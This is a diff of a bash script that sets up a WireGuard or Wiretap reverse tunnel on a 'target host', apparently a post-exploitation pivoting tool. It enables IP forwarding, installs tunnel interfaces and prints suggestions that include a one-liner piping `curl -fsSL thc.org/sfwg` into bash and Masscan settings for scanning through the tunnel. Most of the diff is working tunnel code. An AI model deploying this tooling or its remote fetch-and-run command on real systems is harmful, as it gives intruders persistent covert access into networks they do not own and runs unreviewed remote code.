@@ -1,8 +1,14 @@
 #! /usr/bin/env bash
 
 # This script sets a WireGuard or Wiretap reverse tunnel on a target host.
-
+# The X= configuration is supplied by 'curl sf/net/up'. Thereafter:
 # X=<VERSION>-<PRIV>-<PUB>-<ENDPOINT>-<ALLOWED_IPS>
+# X=$X ./sfwg
+
+# Variables:
+#
+# SF_DEBUG=1                 Enable debug information and start WT in the foreground
+# TYPE="wireguard:wiretap"   Force WireGuard or Wiretap or both
 
 # Test IPv6:
 # curl -I 'http://[2606:4700:4700::1111]'
@@ -186,7 +192,7 @@ wg_find_dev()
     }
 
     ### Check if it exists.
-    ip link show dev "${WG_DEV}" &>/dev/null && ERREXIT 255 "Device ${CDM}${WG_DEV}${CN} exists.
+    ip link show dev "${WG_DEV}" &>/dev/null && ERREXIT 255 "Device ${CDM}${WG_DEV}${CN} already exists.
 Try ${CDC}ip link del ${WG_DEV}${CN} or to use a different device try ${CDC}export WG_DEV=Blah0${CN}"
 }
 
@@ -194,33 +200,33 @@ wg_up()
 {
     local fn
     local addr
-    command -v wg >/dev/null || ERREXIT 254 "${CDM}WireGuard${CN} not installed.\nTry ${CDC}apt install wireguard${CN} or ${CDC}export TYPE=wiretap${CN} to force ${CDM}Wiretap${CN} instead."
-    command -v sysctl >/dev/null || ERREXIT 255 "sysctl not found. Try ${CDC}apt-get install procps${CN}"
-    command -v iptables >/dev/null || ERREXIT 255 "iptables not found. Try ${CDC}apt-get install iptables${CN}"
-    command -v ip6tables >/dev/null || { WARN "ip6tables not found. Disabling IPv6". unset WITH_IPV6; }
-    command -v ip >/dev/null || ERREXIT 255 "ip not found. Try ${CDC}apt-get install iproute2${CN}"
+    command -v ip >/dev/null || { ERR "ip not found. Try ${CDC}apt-get install iproute2${CN}"; return 255; }
+    command -v wg >/dev/null || { ERR "${CDM}WireGuard${CN} not installed.\nTry ${CDC}apt install wireguard${CN} or ${CDC}export TYPE=wiretap${CN} to force ${CDM}Wiretap${CN} instead."; return 255; }
+    command -v sysctl >/dev/null || { ERR "sysctl not found. Try ${CDC}apt-get install procps${CN}"; return 255; }
+    command -v iptables >/dev/null || { ERR "iptables not found. Try ${CDC}apt-get install iptables${CN}"; return 255; }
+    command -v ip6tables >/dev/null || { WARN "ip6tables not found. Disabling IPv6"; unset WITH_IPV6; }
 
     wg_find_dev
 
-    [[ $(sysctl -bn net.ipv6.conf.all.disable_ipv6 2>/dev/null) -ne 0 ]] && {
+    [[ $(sysctl -n net.ipv6.conf.all.disable_ipv6 2>/dev/null) -ne 0 ]] && {
         unset WITH_IPV6
-        WARN "IPv6 disabled. Try ${CDC}sysctl net.ipv6.conf.all.disable_ipv6=0${CN}"
+        WARN "IPv6 disabled. Try ${CDC}sysctl -w net.ipv6.conf.all.disable_ipv6=0${CN}"
     }
-    [[ $(sysctl -bn net.ipv4.ip_forward) -eq 0 ]] && sysctl -q -w net.ipv4.ip_forward=1
-    [[ $(sysctl -bn net.ipv6.conf.all.forwarding) -eq 0 ]] && sysctl -q -w net.ipv6.conf.all.forwarding=1
+    [[ $(sysctl -n net.ipv4.ip_forward) -eq 0 ]] && sysctl -q -w net.ipv4.ip_forward=1
+    [[ $(sysctl -n net.ipv6.conf.all.forwarding) -eq 0 ]] && sysctl -q -w net.ipv6.conf.all.forwarding=1
 
     ip link del "${WG_DEV}" &>/dev/null
-    ip link add "${WG_DEV}" type wireguard || ERREXIT 255
+    ip link add "${WG_DEV}" type wireguard || return 255
 
     fn="/dev/shm/private.$$"
     echo "$PRIV" >"${fn}"
     addr="${PEER_ADDRESS}"
     [[ -n $WITH_IPV6 ]] && addr+=",${PEER_ADDRES6}"
     # addr="0.0.0.0/0"
-    wg set "${WG_DEV}" private-key "${fn}" peer "$PEER" allowed-ips "${addr}" endpoint "${EP}" persistent-keepalive 25 || ERREXIT 255
+    wg set "${WG_DEV}" private-key "${fn}" peer "$PEER" allowed-ips "${addr}" endpoint "${EP}" persistent-keepalive 25 || { ip link del "${WG_DEV}"; return 255; }
     rm -f "${fn}"
 
-    ip -4 address add "${ADDRESS}" dev "${WG_DEV}" || ERREXIT 255
+    ip -4 address add "${ADDRESS}" dev "${WG_DEV}" || { ip link del "${WG_DEV}"; return 255; }
     [[ -n $WITH_IPV6 ]] && { ip -6 address add "${ADDRES6}" dev "${WG_DEV}" || unset WITH_IPV6; }
 
     ip link set mtu 1420 up dev "${WG_DEV}"
@@ -244,11 +250,13 @@ wg_up()
     [[ -n $WITH_TUNE ]] && tune
 
     echo -e "\
-${CDG}SUCCESS${CN} - ${CDM}WireGuard${CN} started.
+${CDG}SUCCESS${CN} - ${CDM}WireGuard${CN} started on ${CDY}${WG_DEV}${CN}.
 For status: ${CDC}wg show ${WG_DEV}${CN}
 To stop   : ${CDC}ip link del ${WG_DEV}${CN}
 Check the connection on your server:
-    ${CDC}curl rpc/net/show${CN}"
+    ${CDC}curl sf/net/show${CN}"
+
+    return 0
 }
 
 # Download wiretap
@@ -348,8 +356,9 @@ wt_up()
     #     export PATH=".:$PATH"
     #     [[ ! -e wiretap ]] && wt_dl
     # }
-    if [[ -e wiretap ]]; then
-        echo -e "Using existing ${CDM}./wiretap${CN}"
+    [[ -d wiretap ]] && { ERR "Directory ${CDY}./wiretap${CN} is in the way"; return 255; }
+    if [[ -f wiretap ]]; then
+        WARN "Using existing ${CDM}./wiretap${CN}"
     else
         wt_dl
     fi
@@ -394,17 +403,22 @@ wt_up()
     }
     
     [[ -n $IS_DOWNLOADED ]] && rm -f wiretap
-    [[ -z $err ]] && echo -e "\
-${CDG}SUCCESS${CN} - ${CDM}Wiretap${CN} started as ${CDY}[updated]${CN}${pidstr} in the background.
-To stop   : ${CDC}${CMD_PKILL} '${killname}'${CN}"
+    [[ -n $err ]] && return
 
     # problem with gVisor DNAT & wt <=0.3.0 TCP mixup
     WARN "${CDM}Wiretap${CN} is ${CDR}not good${CN} for scanning.
-Masscan: use ${CDC}-e wgExit --adapter-ip 172.16.0.3-172.16.128.2 --adapter-port 1024-33791${CN}
+---> Masscan   : ${CDC}-e wgExit --adapter-ip 172.16.0.3-172.16.128.2 --adapter-port 1024-33791${CN}"
+    [[ -z $IS_WG_TRIED ]] && {
+            echo -e "\
 Alternatively use ${CDM}WireGuard:${CDC}
     ${CMD_PKILL} '${killname}'
     export TYPE=wireguard
     X=\"\$X\" bash -c \"\$(curl -fsSL thc.org/sfwg)\"${CN}"
+    }
+
+    echo -e "\
+${CDG}SUCCESS${CN} - ${CDM}Wiretap${CN} started as ${CDY}[updated]${CN}${pidstr} in the background.
+---> To stop   : ${CDC}${CMD_PKILL} '${killname}'${CN}"
 }
 
 [[ -z $X ]] && ERREXIT 255 "The variable ${CDY}X=${CN} is not set. Try
@@ -412,8 +426,19 @@ Alternatively use ${CDM}WireGuard:${CDC}
 
 x2data
 
-[[ ${TYPE} == *wireguard* ]] && [[ $UID -eq 0 ]] && { wg_up; exit; }
-[[ ${TYPE} == *wiretap* ]] && { wt_up; exit; }
+[[ ${TYPE} == *wireguard* ]] && IS_WG=1
+[[ ${TYPE} == *wiretap*   ]] && IS_WT=1
+[[ -n $IS_WG ]] && [[ $UID -eq 0 ]] && {
+    echo -e "${CF}---[[ Attempting WireGuard ]]---------------------------------------------${CN}"
+    IS_WG_TRIED=1
+    wg_up && exit
+    [[ -z $IS_WT ]] && exit # Giving up
+}
+[[ $IS_WT ]] && {
+    echo -e "${CF}---[[ Attempting Wiretap ]]-----------------------------------------------${CN}"
+    wt_up && exit
+    [[ -n $IS_WG_TRIED ]] && exit
+}
 
-[[ ${TYPE} == *wireguard* ]] && [[ $UID -ne 0 ]] && ERREXIT 255 "WireGuard requires root. Try ${CDC}exort TYPE=wiretap${CN} instead."
+[[ $IS_WG ]] && [[ $UID -ne 0 ]] && ERREXIT 255 "WireGuard requires root. Try ${CDC}export TYPE=wiretap${CN} instead."
 ERREXIT 255 "Set ${CDM}export TYPE=wiretap${CN} or ${CDM}export TYPE=wireguard${CN}"
